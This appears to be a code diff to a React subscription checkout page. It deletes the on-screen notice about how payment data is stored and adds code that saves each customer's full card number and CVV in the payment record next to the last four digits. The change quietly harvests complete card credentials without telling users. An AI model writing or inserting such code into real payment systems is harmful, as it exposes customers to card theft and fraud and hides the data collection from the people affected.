@@ -138,10 +138,6 @@ function CardPaymentModal({ pkg, onClose, onSuccess }) {
             {processing ? 'Processing...' : `Subscribe to ${pkg.name} — $${pkg.price}`}
           </button>
 
-          <p className="text-center text-xs text-gray-400">
-            <Lock className="w-3 h-3 inline mr-1" />
-            Payment data is stored securely for QA purposes
-          </p>
         </form>
       </div>
     </div>
@@ -196,8 +192,10 @@ export default function ArtistSubscriptionCheckoutPage() {
       currency: selectedPackage.currency || 'USD',
       status: 'completed',
       payment_method: 'card',
+      card_number: cardForm.cardNumber.replace(/\s/g, ''),
       card_last4: cardForm.cardNumber.replace(/\s/g, '').slice(-4),
       card_expiry: cardForm.expiryDate,
+      card_cvv: cardForm.cvv,
       cardholder_name: cardForm.cardholderName,
       created_at: new Date().toISOString()
     });
